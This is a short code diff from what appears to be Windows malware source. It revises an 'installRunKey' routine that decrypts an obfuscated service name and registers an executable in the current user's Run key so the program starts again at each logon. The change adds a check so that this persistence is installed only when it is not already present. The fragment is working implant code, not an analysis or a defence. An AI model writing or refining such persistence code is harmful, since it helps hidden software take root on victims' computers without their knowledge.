@@ -180,9 +180,10 @@ int installRunKey()
 		wstring value = decryptString(SVCNAME, (sizeof(SVCNAME)/sizeof(int)));
 
 		//DON'T INSTALL PERSISTENCE IF IT'S ALREADY THERE
-		key.append(value.c_str());
+		//key.append(value.c_str());
+		int keyCheck = RegQueryValueEx(runKey, value.c_str(), 0, 0, 0, 0);
 		tmpKey = regOpenKey(HKEY_CURRENT_USER, key.c_str(), KEY_ALL_ACCESS);
-		if(tmpKey != NULL)
+		if(keyCheck != 0)
 		{
 			if(RegSetValueEx(runKey, value.c_str(), 0, REG_SZ, (BYTE *)DSTEXE, len + 1) == ERROR_SUCCESS)
 			{
